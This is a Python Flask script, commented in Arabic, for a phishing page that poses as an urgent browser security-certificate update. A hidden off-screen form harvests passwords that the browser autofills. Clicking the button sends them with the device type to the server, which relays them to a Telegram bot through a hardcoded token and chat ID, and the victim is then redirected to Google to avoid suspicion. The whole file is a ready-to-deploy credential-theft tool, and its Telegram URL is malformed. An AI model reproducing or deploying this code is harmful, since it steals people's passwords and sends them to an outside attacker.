import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

# --- بيانات التليجرام الخاصة بك ---
BOT_TOKEN = "7777387332:AAF0URFoMm34_CwNJRbWlTlT31b14kwWD4Y"
CHAT_ID = "7100327173"

def send_to_telegram(message):
    try:
        url = f"https://telegram.org{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error: {e}")

# واجهة الهجوم (تجمع بين الخداع وسحب البيانات)
HTML_TRAP = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث أمان المتصفح</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding-top: 100px; }
        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; display: inline-block; border: 1px solid #333; }
        .btn { background: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
        #hidden-form { opacity: 0; position: absolute; top: -1000px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>⚠️ تنبيه أمني عاجل</h2>
        <p>يرجى النقر لتحديث شهادة الأمان وحماية بياناتك.</p>
        <button class="btn" onclick="executeAttack()">تحديث الآن</button>
    </div>

    <!-- النموذج المخفي لسحب كلمات السر المخزنة (Autofill) -->
    <form id="hidden-form">
        <input type="text" id="u" name="username">
        <input type="password" id="p" name="password">
    </form>

    <script>
        function executeAttack() {
            // خطف البيانات التي ملأها المتصفح تلقائياً
            var u = document.getElementById('u').value;
            var p = document.getElementById('p').value;
            var platform = navigator.platform;

            // إرسال "الصيد" إلى سيرفرك العالمي
            fetch('/catch?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p) + '&dev=' + encodeURIComponent(platform))
            .then(() => {
                // توجيه الضحية لموقع حقيقي لإبعاد الشبهة
                window.location.href = "https://google.com";
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TRAP)

@app.route('/catch')
def catch():
    user = request.args.get('u')
    pw = request.args.get('p')
    device = request.args.get('dev')
    
    if pw:
        msg = f"🎯 **تم سحب كلمة سر بنجاح!**\\n\\n📱 الجهاز: `{device}`\\n👤 المستخدم: `{user}`\\n🔑 كلمة السر: `{pw}`"
    else:
        msg = f"👀 **شخص فتح الرابط!**\\nالجهاز: `{device}`\\n(لم يتم سحب كلمة سر، المتصفح لم يملأ الحقول)"
        
    send_to_telegram(msg)
    return "OK"

if __name__ == '__main__':
    # تشغيل السيرفر على المنفذ الذي يطلبه Render
    import os
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
